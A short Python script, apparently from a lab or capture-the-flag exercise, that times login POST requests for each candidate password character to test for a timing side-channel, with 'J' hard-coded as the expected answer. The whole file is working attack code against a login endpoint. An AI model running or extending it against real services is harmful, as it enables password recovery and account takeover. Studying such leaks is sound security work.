import requests
import string
import numpy as np

import time
import sys

BASE_URL = sys.argv[1]

ALPHABET = string.ascii_letters + string.digits

m = {}

for c in ALPHABET:
    t1 = time.time()
    requests.post(BASE_URL + '/login', data={'username': 'marty_mcfly', 'password': 'fU' + c + 'asdfssd'})
    t2 = time.time()
    m[c] = t2 - t1
    print(c + ',' + str(t2-t1))



x = m['J']
L = np.array(list(m.values()))
print(x, np.mean(L), np.std(L), (x-np.mean(L))/np.std(L), max(m.keys(), key=m.get) == 'J')

#print(m)
#print(sorted(m, key=m.get))
#print(np.mean(list(m.values())))
#print(max(m))


